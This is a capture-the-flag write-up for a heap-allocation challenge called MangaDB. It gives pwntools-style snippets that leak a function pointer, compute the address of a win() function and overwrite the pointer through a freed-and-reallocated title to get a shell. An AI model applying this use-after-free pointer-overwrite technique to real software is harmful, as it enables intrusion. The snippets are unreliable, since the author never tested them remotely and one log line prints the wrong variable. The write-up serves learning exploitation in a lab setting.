# MangaDB
Heap allocation vulnerability that I never got the chance to test remotely because the challenge was down for the whole CTF.

The application gave you the ability to create, edit, delete, and print anime/manga. When printing the anime/manga, it would call a function that was allocated next to the title.

There was also a function win() that called system("/bin/sh"). This was the goal.

The steps to solve were:

- Allocate 3 anime/manga structures (preferably all the same type so it's easier to calculate the pointer):
```
create("Z", "1") # type 1 = anime
create("X", "1")
create("L", "1")
```
- Edit one of the anime/manga, then print to leak the pointer and calculate the win() pointer from it
```
edit("X", "AAAA")
r.sendline("3") # 3 = print - I didn't make a function for this
p1 = x.find("Anime: L\nAnime: ")      
p2 = x.find("Anime: Z")
ptr = u64(x[p1+16:p2].ljust(8, b'\0')) # Carve pointer and pad it
log.info(f"print_anime pointer: {hex(ptr)}")
ptr_win = ptr - 0x1238 + 0x11E9
log.info(f"win pointer: {hex(ptr)}")
```
- Delete the anime/manga title that originally contained the pointer so we can write over it
```
delete("X")
```
- Create a new anime/manga with the title set to win()'s pointer, print again, and you have a shell
```
create(p64(ptr_win), "1")
r.sendline(b"3") # print, again
r.interactive()
```